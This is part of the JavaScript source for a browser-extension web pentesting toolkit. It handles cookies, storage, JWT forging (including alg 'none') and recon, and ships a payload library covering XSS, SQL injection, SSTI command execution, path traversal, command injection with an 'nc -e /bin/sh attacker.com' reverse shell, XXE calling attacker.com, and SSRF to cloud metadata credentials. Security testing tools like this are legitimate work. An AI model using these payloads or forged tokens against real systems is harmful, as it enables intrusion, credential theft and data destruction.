  const maxLeft = window.innerWidth - m.offsetWidth - pad;
  const maxTop = window.innerHeight - m.offsetHeight - pad;
  const left = Math.max(pad, Math.min(x, maxLeft));
  const top = Math.max(pad, Math.min(y, maxTop));
  m.style.left = `${left}px`;
  m.style.top = `${top}px`;
}
function hideCtxMenu() {
  $('ctx-menu').classList.add('hidden');
  state.ctxSource = null;
}

function activateTab(tabName) {
  $$('.tab-btn').forEach(b => b.classList.remove('active'));
  $$('.tab-pane').forEach(p => { p.classList.remove('active'); p.classList.add('hidden'); });
  document.querySelector(`.tab-btn[data-tab="${tabName}"]`)?.classList.add('active');
  const pane = $(`tab-${tabName}`);
  if (pane) {
    pane.classList.remove('hidden');
    pane.classList.add('active');
  }
}

function getCtxValue() {
  const src = state.ctxSource;
  if (!src) return null;
  if (src.kind === 'cookie') {
    const c = state.cookiesCache[src.idx];
    return c?.value ?? null;
  }
  if (src.kind === 'storage') {
    const cache = src.storageType === 'local' ? state.localCache : state.sessionCache;
    return cache?.[src.key] ?? null;
  }
  if (src.kind === 'payload') return src.value;
  return null;
}

function ctxSendToEncode() {
  const value = getCtxValue();
  if (value == null) { toast('No value selected', 'error'); hideCtxMenu(); return; }
  activateTab('tools');
  $('encode-input').value = String(value);
  $('encode-output').value = '';
  document.getElementById('tools-encode')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
  toast('Value sent to Encode / Decode', 'success');
  hideCtxMenu();
}

// ─── JWT ↔ Cookie ─────────────────────────────────────────────────────────────

async function jwtSendToCookie() {
  const token = $('jwt-output').value.trim();
  if (!token) { toast('Forge token first', 'error'); return; }
  const c = state.jwtSourceCookie;
  if (!c) { toast('No source cookie', 'error'); return; }
  const scheme = (c.secure || state.tabUrl.startsWith('https')) ? 'https' : 'http';
  const host   = c.domain.startsWith('.') ? c.domain.slice(1) : c.domain;
  const url    = `${scheme}://${host}${c.path}`;
  const cookie = { url, name: c.name, value: token, domain: c.domain, path: c.path, httpOnly: c.httpOnly, secure: c.secure, sameSite: c.sameSite };
  if (c.expirationDate) cookie.expirationDate = c.expirationDate;
  const { error } = await bg('SET_COOKIE', { cookie });
  if (error) { toast(`Error: ${error.message}`, 'error'); return; }
  toast(`Cookie "${c.name}" updated`, 'success');
}

// ─── Payload Library ─────────────────────────────────────────────────────────

const PAYLOAD_CATS = [
  { cat: 'XSS', payloads: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '\'"><script>alert(1)</script>',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<video src=1 onerror=alert(1)>',
    '<math><mtext></table><img src=1 onerror=alert(1)>',
    'javascript:alert(1)',
    '" onmouseover="alert(1)',
    '\';alert(1)//',
    '\\";alert(1)//',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>',
  ]},
  { cat: 'SQL Injection', payloads: [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "'; DROP TABLE users;--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=2 UNION SELECT username,password FROM users--",
    "' OR SLEEP(5)--",
    "1 WAITFOR DELAY '0:0:5'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1; SELECT * FROM information_schema.tables--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' ORDER BY 1--",
    "' ORDER BY 100--",
  ]},
  { cat: 'SSTI', payloads: [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '*{7*7}',
    "{{7*'7'}}",
    '{{config}}',
    '{{self}}',
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
  ]},
  { cat: 'Path Traversal', payloads: [
    '../../../etc/passwd',
    '..\\..\\..\\Windows\\win.ini',
    '....//....//....//etc/passwd',
    '../../../etc/passwd%00',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '%252e%252e%252fetc%252fpasswd',
    '/etc/passwd',
    'C:\\Windows\\win.ini',
    'file:///etc/passwd',
    '/proc/self/environ',
    '/var/log/apache2/access.log',
    '....\/....\/....\/etc/passwd',
  ]},
  { cat: 'Command Injection', payloads: [
    '; ls',
    '| ls',
    '&& ls',
    '|| ls',
    '; id',
    '$(id)',
    '`id`',
    '; sleep 5',
    '| sleep 5',
    '; cat /etc/passwd',
    '%0a id',
    '%0a cat /etc/passwd',
    '$(cat /etc/passwd)',
    '& ping -c 5 127.0.0.1 &',
    '; nc -e /bin/sh attacker.com 4444',
  ]},
  { cat: 'Open Redirect', payloads: [
    '//evil.com',
    '//evil.com/',
    'https://evil.com',
    '//evil.com@trusted.com',
    '\\/\\/evil.com',
    '/%09/evil.com',
    '///evil.com',
    '//\tevil.com',
    '%2F%2Fevil.com',
    '//evil.com%23',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
  ]},
  { cat: 'XXE', payloads: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo/>',
    '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">%init;]><foo/>',
  ]},
  { cat: 'SSRF', payloads: [
    'http://127.0.0.1/',
    'http://localhost/',
    'http://0.0.0.0/',
    'http://[::1]/',
    'http://169.254.169.254/',
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://100.100.100.200/latest/meta-data/',
    'dict://127.0.0.1:6379/',
    'file:///etc/passwd',
    'gopher://127.0.0.1:3306/',
    'http://0177.0.0.1/',
    'http://0x7f.0x0.0x0.0x1/',
  ]},
];

const Payloads = {
  filter: '',

  render() {
    const out = $('payload-output');
    if (!out) return;
    const q = this.filter.toLowerCase();
    let html = '';
    PAYLOAD_CATS.forEach(({ cat, payloads }, idx) => {
      const visible = q
        ? payloads.filter(p => p.toLowerCase().includes(q) || cat.toLowerCase().includes(q))
        : payloads;
      if (!visible.length) return;
      html += `<div class="recon-section">
        <h4>${esc(cat)} <span class="dim">(${visible.length})</span>
          <button class="payload-copy-all recon-copy-btn" data-idx="${idx}" title="Copy all">Copy all</button>
        </h4>
        <div class="payload-list">`;
      visible.forEach(p => {
        html += `<div class="payload-row">
          <span class="payload-text" title="${esc(p)}">${esc(p)}</span>
          <button class="payload-copy-one recon-copy-btn" data-val="${esc(p)}" title="Copy">⧉</button>
        </div>`;
      });
      html += `</div></div>`;
    });
    if (!html) html = '<div class="muted" style="padding:16px;font-size:13px">No payloads match</div>';
    out.innerHTML = html;
  },
};

// ─── Cookie Export / Import ───────────────────────────────────────────────────

function triggerDownload(filename, json) {
  const blob = new Blob([json], { type: 'application/json' });
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement('a');
  a.href = url; a.download = filename; a.click();
  URL.revokeObjectURL(url);
}

function exportCookies() {
  if (!state.cookiesCache.length) { toast('No cookies to export', 'warn'); return; }
  const hostname = (() => { try { return new URL(state.tabUrl).hostname; } catch { return 'cookies'; } })();
  triggerDownload(`cookies-${hostname}-${Date.now()}.json`, JSON.stringify(state.cookiesCache, null, 2));
  toast(`Exported ${state.cookiesCache.length} cookies`, 'success');
}

async function importCookies(file) {
  let cookies;
  try { cookies = JSON.parse(await file.text()); } catch { toast('Invalid JSON', 'error'); return; }
  if (!Array.isArray(cookies)) { toast('Expected JSON array', 'error'); return; }
  let ok = 0;
  for (const c of cookies) {
    if (!c.name || !c.domain) continue;
    const scheme = c.secure ? 'https' : 'http';
    const host   = c.domain.startsWith('.') ? c.domain.slice(1) : c.domain;
    const cookie = {
      url:      `${scheme}://${host}${c.path || '/'}`,
      name:     c.name, value: c.value || '',
      domain:   c.domain, path: c.path || '/',
      httpOnly: !!c.httpOnly, secure: !!c.secure,
      sameSite: c.sameSite || 'no_restriction',
    };
    if (c.expirationDate) cookie.expirationDate = c.expirationDate;
    const { error } = await bg('SET_COOKIE', { cookie });
    if (!error) ok++;
  }
  await Cookies.load();
  toast(`Imported ${ok} / ${cookies.length} cookies`, ok === cookies.length ? 'success' : 'warn');
}

// ─── Profiles Export / Import ─────────────────────────────────────────────────

async function exportProfiles() {
  const data = await chrome.storage.local.get(['roles', 'uaProfiles', 'proxyProfiles', 'headerProfiles']);
  triggerDownload(`spectre-profiles-${Date.now()}.json`, JSON.stringify({ version: 1, ...data }, null, 2));
  toast('Profiles exported', 'success');
}

async function importProfiles(file) {
  let data;
  try { data = JSON.parse(await file.text()); } catch { toast('Invalid JSON', 'error'); return; }
  const {
    roles = [], uaProfiles = [], proxyProfiles = [], headerProfiles = [],
  } = data;
  await chrome.storage.local.set({ roles, uaProfiles, proxyProfiles, headerProfiles });
  state.roles = roles;
  Auth.renderRoles();
  UserAgent.profiles = uaProfiles;
  UserAgent.renderProfiles();
  Proxy.profiles = proxyProfiles;
  Proxy.renderProfiles();
  HeaderProfiles.profiles = headerProfiles;
  HeaderProfiles.renderProfiles();
  bg('SYNC_ROLE_MENUS');
  toast(`Imported: ${roles.length} roles, ${uaProfiles.length} UA, ${proxyProfiles.length} proxy, ${headerProfiles.length} header profiles`, 'success');
}

// ─── Wire-up ──────────────────────────────────────────────────────────────────

document.addEventListener('DOMContentLoaded', async () => {
  initTabs();

  // ── Cookies ──
  $('cookies-refresh').addEventListener('click', () => Cookies.load());
  $('cookies-add').addEventListener('click', () => Cookies.openEdit(null));
  $('cookies-clear').addEventListener('click', () => Cookies.clearAll());
  $('cookies-export').addEventListener('click', () => exportCookies());
  $('cookies-import-btn').addEventListener('click', () => $('cookies-import-input').click());
  $('cookies-import-input').addEventListener('change', e => {
    const f = e.target.files[0];
    if (f) importCookies(f).finally(() => { e.target.value = ''; });
  });
  $('cookies-filter').addEventListener('input', () => Cookies.render());
  $('ck-save').addEventListener('click', () => Cookies.save());
  $('ck-cancel').addEventListener('click', () => Cookies.closeModal());

  // Action buttons via data-action delegation
  $('cookies-body').addEventListener('click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    const idx = +btn.dataset.idx;
    switch (btn.dataset.action) {
      case 'del':      Cookies.del(idx); break;
      case 'copy':     copyText(state.cookiesCache[idx].value); toast('Copied','success'); break;
      case 'send-jwt': Cookies.sendToJWT(idx); break;
      case 'edit':     Cookies.openEdit(idx); break;
    }
  });

  // Right-click JWT row → context menu
  $('cookies-body').addEventListener('contextmenu', e => {
    const row = e.target.closest('.st-entry[data-idx]');
    if (!row) { hideCtxMenu(); return; }
    e.preventDefault();
    const idx = +row.dataset.idx;
    const c = state.cookiesCache[idx];
    showCtxMenu(e.clientX, e.clientY, {
      kind: 'cookie',
      idx,
      canSendEncode: true,
      canSendJwt: !!c && isJWT(c.value),
    });
  });
  const storageContext = e => {
    const row = e.target.closest('.st-entry[data-type][data-key]');
    if (!row) { hideCtxMenu(); return; }
    e.preventDefault();
    showCtxMenu(e.clientX, e.clientY, {
      kind: 'storage',
      storageType: row.dataset.type,
      key: row.dataset.key,
      canSendEncode: true,
      canSendJwt: false,
    });
  };
  $('local-body').addEventListener('contextmenu', storageContext);
  $('session-body').addEventListener('contextmenu', storageContext);
  document.addEventListener('click', hideCtxMenu);
  $('ctx-send-jwt').addEventListener('click', () => {
    const src = state.ctxSource;
    if (src?.kind === 'cookie' && src.idx != null) Cookies.sendToJWT(src.idx);
  });
  $('ctx-send-encode').addEventListener('click', ctxSendToEncode);
  $('ctx-copy-urlencoded').addEventListener('click', () => {
    const value = getCtxValue();
    if (value == null) { toast('No value selected', 'error'); hideCtxMenu(); return; }
    copyText(encodeURIComponent(value));
    toast('Copied URL encoded', 'success');
    hideCtxMenu();
  });

  // ── Storage ──
  $('storage-refresh').addEventListener('click', () => {
    if (state.storageView === 'local') Storage.loadLocal(); else Storage.loadSession();
  });
  $('storage-add').addEventListener('click', () => Storage.openAdd(state.storageView));
  $('storage-clear-btn').addEventListener('click', () => Storage.clearAll(state.storageView));
  $('storage-switch-local').addEventListener('click', () => Storage.switchView('local'));
  $('storage-switch-session').addEventListener('click', () => Storage.switchView('session'));
  $('sk-save').addEventListener('click',   () => Storage.save());
  $('sk-cancel').addEventListener('click', () => Storage.closeModal());
  $('storage-filter').addEventListener('input', () => {
    const cache = state.storageView === 'local' ? state.localCache : state.sessionCache;
    Storage.renderTable(state.storageView, cache);
  });

  // Auto-load when switching to cookies tab
  document.querySelector('.tab-btn[data-tab="cookies"]').addEventListener('click', () => Cookies.load());

  // Re-populate JWT input from pinned cookie source when switching to JWT tab
  document.querySelector('.tab-btn[data-tab="jwt"]').addEventListener('click', () => {
    if (state.jwtSourceCookie !== null && !$('jwt-input').value.trim()) {
      const c = state.cookiesCache[state.jwtSourceCookie];
      if (c) { $('jwt-input').value = c.value; JWT.decode(); }
    }
  });

  // Auto-load when switching to storage tab
  document.querySelector('.tab-btn[data-tab="storage"]').addEventListener('click', async () => {
    Storage.switchView(state.storageView);
    if (state.storageView === 'local') await Storage.loadLocal();
    else await Storage.loadSession();
  });

  const storageClick = e => {
    const target = e.target instanceof Element ? e.target : e.target?.parentElement;
    if (!target) return;

    const collapseBtn = target.closest('.collapse-btn');
    if (collapseBtn && collapseBtn.closest('.collapsible')) {
      const wrap = collapseBtn.closest('.collapsible');
      wrap.classList.toggle('collapsed');
      // icon handled by CSS ::after based on .collapsed class
      return;
    }

    const btn = target.closest('[data-action]');
    if (btn) {
      switch (btn.dataset.action) {
        case 'st-edit': Storage.openEdit(btn.dataset.st, btn.dataset.skey); break;
        case 'st-del':  Storage.del(btn.dataset.st, btn.dataset.skey); break;
        case 'st-copy': copyText(btn.dataset.val); toast('Copied','success'); break;
        case 'toggle-collapse': {
          const wrap = btn.closest('.collapsible');
          if (wrap) {
            wrap.classList.toggle('collapsed');
            const toggle = wrap.querySelector('.collapse-btn');
            // icon handled by CSS ::after based on .collapsed class
          }
          break;
        }
      }
      return;
    }
  };
  $('local-body').addEventListener('click',   storageClick);
  $('session-body').addEventListener('click', storageClick);

  // ── JWT ──
  $('jwt-decode-btn').addEventListener('click', () => {
    try {
      const { header, payload } = JWT.decode($('jwt-input').value);
      $('jwt-header').value  = JSON.stringify(header, null, 2);
      $('jwt-payload').value = JSON.stringify(payload, null, 2);
      $('jwt-sections').classList.remove('hidden');
    } catch (e) { toast(String(e), 'error'); }
  });

  $('jwt-clear-btn').addEventListener('click', () => {
    $('jwt-input').value = $('jwt-output').value = '';
    $('jwt-sections').classList.add('hidden');
  });

  $('jwt-alg').addEventListener('change', () => {
    $('jwt-secret-wrap').style.display = $('jwt-alg').value.toLowerCase() === 'none' ? 'none' : '';
  });

  $('jwt-sign-btn').addEventListener('click', async () => {
    try {
      const header  = JSON.parse($('jwt-header').value);
      const payload = JSON.parse($('jwt-payload').value);
      const alg     = $('jwt-alg').value;
      let token;
      if (alg.toLowerCase() === 'none') {
        token = JWT.signNone(header, payload, alg);
      } else {
        const secret = $('jwt-secret').value;
        if (!secret) { toast('Secret required for HS256', 'error'); return; }
        token = await JWT.signHS256(header, payload, secret);
      }
      $('jwt-output').value = token;
      toast('Token forged', 'success');
    } catch (e) { toast(String(e), 'error'); }
  });

  $('jwt-verify-btn').addEventListener('click', async () => {
    try {
      const token  = $('jwt-output').value || $('jwt-input').value;
      const secret = $('jwt-secret').value;
      if (!secret) { toast('Secret required for verify', 'error'); return; }
      const ok = await JWT.verifyHS256(token, secret);
      const el = $('jwt-verify-result');
      el.textContent = ok ? '✓ Signature valid' : '✗ Signature invalid';
      el.className = ok ? 'ok' : 'bad';
      el.classList.remove('hidden');
    } catch (e) { toast(String(e), 'error'); }
  });

  $('jwt-copy-btn').addEventListener('click', () => {
    copyText($('jwt-output').value);
    toast('Copied', 'success');
  });

  $('jwt-use-btn').addEventListener('click', () => {
    $('jwt-input').value = $('jwt-output').value;
    toast('Loaded into input', 'info');
  });

  $('jwt-to-cookie-btn').addEventListener('click', jwtSendToCookie);

  // ── Recon ──
  $('recon-forms').addEventListener('click',  () => Recon.forms());
  $('recon-links').addEventListener('click',  () => Recon.links());
  $('recon-tech').addEventListener('click',   () => Recon.techStack());
  $('recon-hidden').addEventListener('click', () => Recon.hiddenFields());
  $('recon-source').addEventListener('click',  () => Recon.sourceScan());
  $('recon-secrets').addEventListener('click', () => Recon.secrets());
  $('recon-domxss').addEventListener('click',       () => Recon.domXSS());
  $('recon-storage-scan').addEventListener('click', () => Recon.storageScan());
  $('recon-run-all').addEventListener('click',      () => Recon.runAll());
  $('recon-copy-all').addEventListener('click', () => {
    const md = allReconToMarkdown();
    if (!md) { toast('Nothing to copy', 'warn'); return; }
    copyText(md);
    toast('All recon copied as Markdown', 'success');
  });
  $('recon-clear').addEventListener('click',   () => { $('recon-output').innerHTML = ''; });
  $('recon-output').addEventListener('click', e => {
    const secretsCopy = e.target.closest('[data-action="secrets-copy"]');
    if (secretsCopy) {
      copyText(secretsCopy.dataset.val);
      toast('Copied', 'success');
      return;
    }

    const copyBtn = e.target.closest('[data-action="recon-copy"]');
    if (copyBtn) {
      const section = copyBtn.closest('.recon-section');
      if (section) {
        copyText(sectionToMarkdown(section));
        toast('Copied as Markdown', 'success');
      }
      return;
    }

    const toggleBtn = e.target.closest('[data-action="recon-section-toggle"]');
    if (toggleBtn) {
      const section = toggleBtn.closest('.recon-section');
      const body = section?.querySelector('.recon-section-body');
      if (body) {
        const collapsed = body.classList.toggle('hidden');
        section.classList.toggle('recon-section-collapsed', collapsed);
      }
      return;
    }

    const scrollLink = e.target.closest('[data-scroll-to]');
    if (scrollLink) {
      document.getElementById(scrollLink.dataset.scrollTo)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
      return;
    }

    const el = e.target.closest('[data-action="toggle-collapse"]');
    if (!el) return;
    const wrap = el.closest('.recon-spider-extra');
    if (!wrap) return;
    wrap.classList.toggle('collapsed');
    const btn = wrap.querySelector('.collapse-btn');
    // icon handled by CSS ::after based on .collapsed class
  });

  // ── Auth ──
  $('role-type').addEventListener('change', () => {
    const t = $('role-type').value;
    $('role-header-name').classList.toggle('hidden', t !== 'custom');
    $('role-cookie-name').classList.toggle('hidden', t !== 'cookie');
  });
  $('roles-list').addEventListener('click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    switch (btn.dataset.action) {
      case 'edit-role':  Auth.startEdit(+btn.dataset.roleId); break;
      case 'apply-role': Auth.applyRole(+btn.dataset.roleId); break;
      case 'eject-role': Auth.ejectRole(); break;
      case 'del-role':   Auth.deleteRole(+btn.dataset.roleId); break;
    }
  });
  $('role-save-btn').addEventListener('click', () => Auth.saveRole());
  $('role-edit-cancel').addEventListener('click', () => Auth.cancelEdit());
  $('role-clear-btn').addEventListener('click', () => Auth.clearRoles());
  $('ua-apply-btn').addEventListener('click', () => UserAgent.apply());
  $('ua-reset-btn').addEventListener('click', () => UserAgent.reset());
  $('ua-save-btn').addEventListener('click', () => UserAgent.saveProfile());
  $('ua-profiles-list').addEventListener('click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    const id = +btn.dataset.uaid;
    switch (btn.dataset.action) {
      case 'ua-apply': UserAgent.applyProfile(id); break;
      case 'ua-del':   UserAgent.deleteProfile(id); break;
    }
  });
  $('ua-preset').addEventListener('change', () => { $('ua-custom').value = ''; });
  UserAgent.loadSaved();
  UserAgent.loadProfiles();

  // ── Proxy ──
  $$('.proxy-quick').forEach(btn => btn.addEventListener('click', () => {
    Proxy.applyPreset(btn.dataset.mode);
  }));
  $('proxy-save-btn').addEventListener('click', () => Proxy.saveProfile());
  $('proxy-profiles-list').addEventListener('click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    const id = +btn.dataset.pid;
    switch (btn.dataset.action) {
      case 'proxy-apply': Proxy.applyProfile(id); break;
      case 'proxy-del':   Proxy.deleteProfile(id); break;
    }
  });
  Proxy.loadSaved();

  // ── Profiles export / import ──
  $('profiles-export-btn').addEventListener('click', () => exportProfiles());
  $('profiles-import-btn').addEventListener('click', () => $('profiles-import-input').click());
  $('profiles-import-input').addEventListener('change', e => {
    const f = e.target.files[0];
    if (f) importProfiles(f).finally(() => { e.target.value = ''; });
  });

  // ── Header Profiles ──
  $('hprof-add-row').addEventListener('click', () => HeaderProfiles.addFormRow());
  $('hprof-save-btn').addEventListener('click', () => HeaderProfiles.saveProfile());
  $('hprof-eject-btn').addEventListener('click', () => HeaderProfiles.ejectProfile());
  $('hprof-list').addEventListener('click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    const id = +btn.dataset.hpid;
    switch (btn.dataset.action) {
      case 'hprof-apply': HeaderProfiles.applyProfile(id); break;
      case 'hprof-del':   HeaderProfiles.deleteProfile(id); break;
    }
  });
  HeaderProfiles.loadProfiles();

  // ── Utils ──
  $('encode-btn').addEventListener('click', () => {
    $('encode-output').value = Encode.encode($('encode-type').value, $('encode-input').value);
  });
  $('decode-btn').addEventListener('click', () => {
    $('encode-output').value = Encode.decode($('encode-type').value, $('encode-input').value);
  });
  $('encode-swap-btn').addEventListener('click', () => {
    const tmp = $('encode-input').value;
    $('encode-input').value = $('encode-output').value;
    $('encode-output').value = tmp;
    $('encode-output').removeAttribute('readonly');
    setTimeout(() => $('encode-output').setAttribute('readonly',''), 0);
  });
  $('encode-copy').addEventListener('click', () => {
    copyText($('encode-output').value);
    toast('Copied', 'success');
  });
  $('encode-clear').addEventListener('click', () => {
    $('encode-input').value = $('encode-output').value = '';
  });

  $('hash-btn').addEventListener('click', async () => {
    const type  = $('hash-type').value;
    const input = $('hash-input').value;
    if (!input) return;
    const out = $('hash-output');
    if (type === 'identify') {
      const candidates = identifyHash(input);
      out.innerHTML = `<div class="hash-candidate">Input: <span class="hash-result-val">${esc(input)}</span></div>`
        + candidates.map(c => `<div class="hash-result-type">${esc(c)}</div>`).join('');
    } else {
      try {
        const hash = await hashString(type, input);
        out.innerHTML = `<div class="hash-result-type">${type.toUpperCase()}</div><div class="hash-result-val">${hash}</div>`;
      } catch (e) { toast(String(e), 'error'); }
    }
  });

  // ── Section jump links ──
  $$('.section-jump').forEach(a => a.addEventListener('click', e => {
    e.preventDefault();
    document.getElementById(a.dataset.target)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }));

  // ── Payloads ──
  document.querySelector('.tab-btn[data-tab="payloads"]').addEventListener('click', () => Payloads.render());
  $('payload-search').addEventListener('input', e => { Payloads.filter = e.target.value; Payloads.render(); });
  $('payload-search-clear').addEventListener('click', () => { $('payload-search').value = ''; Payloads.filter = ''; Payloads.render(); });
  $('payload-output').addEventListener('contextmenu', e => {
    const row = e.target.closest('.payload-row');
    if (!row) return;
    e.preventDefault();
    const text = row.querySelector('.payload-text')?.textContent ?? '';
    showCtxMenu(e.clientX, e.clientY, { kind: 'payload', value: text, canSendEncode: true, canSendJwt: false, canCopyUrlEncoded: true });
  });
  $('payload-output').addEventListener('click', e => {
    const copyAll = e.target.closest('.payload-copy-all');
    if (copyAll) {
      const cat = PAYLOAD_CATS[parseInt(copyAll.dataset.idx)];
      if (cat) { copyText(cat.payloads.join('\n')); toast('Copied all', 'success'); }
      return;
    }
    const copyOne = e.target.closest('.payload-copy-one');
    if (copyOne) { copyText(copyOne.dataset.val); toast('Copied', 'success'); }
  });

  // ── Bootstrap ──
  const activeTab = await getActiveTab();
  state.tabId  = activeTab.id;
  state.tabUrl = activeTab.url ?? '';
  Storage.switchView('local');
  Cookies.load();
  Auth.loadRoles();

  // ── Navigation refresh ──
  async function refreshForNav(url) {
    const tab = await getActiveTab();
    state.tabId  = tab?.id ?? state.tabId;
    state.tabUrl = url ?? tab?.url ?? state.tabUrl;
    Cookies.load();
    Storage.switchView(state.storageView);
  }

  if (typeof chrome.devtools !== 'undefined' && chrome.devtools.network) {
    chrome.devtools.network.onNavigated.addListener(refreshForNav);
  } else {
    chrome.tabs.onUpdated.addListener((tabId, info) => {
      if (tabId === state.tabId && info.status === 'complete') {
        refreshForNav(info.url ?? state.tabUrl);
      }
    });
    chrome.tabs.onActivated.addListener(async ({ tabId }) => {
      const tab = await chrome.tabs.get(tabId).catch(() => null);
      if (tab) { state.tabId = tab.id; state.tabUrl = tab.url ?? ''; Cookies.load(); Storage.switchView(state.storageView); }
    });
  }
});
